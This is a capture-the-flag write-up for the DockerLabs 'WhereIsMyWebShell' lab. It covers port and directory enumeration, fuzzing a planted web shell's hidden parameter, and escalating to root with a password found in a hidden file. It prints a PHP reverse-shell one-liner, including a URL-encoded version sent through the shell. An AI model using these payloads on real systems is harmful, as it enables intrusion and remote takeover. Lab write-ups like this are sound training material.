# WhereIsMyWebShell - Writeup

## 📋 General Information

- **Platform**: DockerLabs
- **Difficulty**: Easy
- **Categories**: Web Exploitation | Command Injection | Privilege Escalation
- **Date**: February 17, 2026
- **Time spent**: ~30 minutes
- **Author**: Samuel Rodríguez aka Testarious

## 🎯 Objective

Find and exploit a hidden web shell on the server to gain system access and escalate privileges.

## 🔍 Reconnaissance and Enumeration

### Port Scanning

We start by scanning the target machine's ports:

```bash
# Full port scan
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

# Detailed scan of open ports
nmap -sCV -p80 172.17.0.2
```

**Results:**
![Nmap](/public/content/screenshots/whereismywebshell/nmap.png)

As we can see, only port 80 is open. When accessing via browser, we observe a simple web page. Apparently there are no inputs or forms that allow us to attempt any injection or attack. So as the next step, we enumerate directories and files on the web server.

### Directory and File Enumeration

```bash
# Directory and file enumeration with gobuster
gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![Gobuster](/public/content/screenshots/whereismywebshell/gobuster.png)

**Findings:**
- warning.html web page
- shell.php page (possible web shell)

When accessing http://172.17.0.2/warning.html we see a web page with the message:

```
This website has been attacked by another hacker, but his webshell has a parameter that I don't remember...
```

This gives us the definitive clue that shell.php is a web shell and that it has a hidden parameter. So we proceed to enumerate the web shell parameters using ffuf:

```bash
# Parameter enumeration with ffuf
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://172.17.0.2/shell.php?FUZZ=whoami -fs 0
```

![Ffuf](/public/content/screenshots/whereismywebshell/ffuf.png)

As we can see in the result, the `parameter` parameter is the one that is available.

## 💻 Exploitation

### Attack Vector 1: Hidden Web Shell

By using the `parameter` parameter in the web shell, we can execute commands on the server. So we proceed to send ourselves a reverse shell:
- We listen on port 9999 with netcat
- We use the revshell.com web resource to generate a reverse shell
- We send the reverse shell

```bash
# Listen on port 9999
nc -nlvp 9999

# Generate the reverse shell with revshell.com
php -r '$sock=fsockopen("172.17.0.1",9999);exec("sh <&3 >&3 2>&3");'

# Although in this case we make it URLencoded:
http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen(%22172.17.0.1%22%2C9999)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

When sending the request to the server, a reverse shell connection is established and we gain access to the system as www-data user.

![Reverse Shell](/public/content/screenshots/whereismywebshell/reverse_shell.png)

## 🔐 Privilege Escalation

### Local Enumeration

After exploring the system a bit in search of interesting files, we look for `.txt` files on the system:

```bash
# Search for .txt files
find / -name "*.txt" -type f 2>/dev/null
```

![Find](/public/content/screenshots/whereismywebshell/find.png)

We found a file `/tmp/.secret.txt` with the root user credentials:

```bash
cat /tmp/.secret.txt

contraseñaderoot123
```

We simply do `su root` and enter the password.

![Su Root](/public/content/screenshots/whereismywebshell/root.png)

Finally, we gain access to the machine as root user 🎉

## 🛠️ Tools Used

| Tool | Version | Specific Use |
|------|---------|--------------|
| nmap | 7.92 | Port and service scanning |
| gobuster | 2.0.1 | Web directory enumeration |
| ffuf | 2.1.0 | Web directory scanning |

## 🔗 Additional Resources

- [DockerLabs WhereIsMyWebShell](https://dockerlabs.es/)
- [Reverse Shell Generator](https://www.revshells.com/)

## 🏆 Conclusion

Ideal machine for beginners that teaches the importance of good web enumeration and searching for clues in hidden files. Good starting point to learn how to identify and exploit web shells. Let's keep going! 🚀
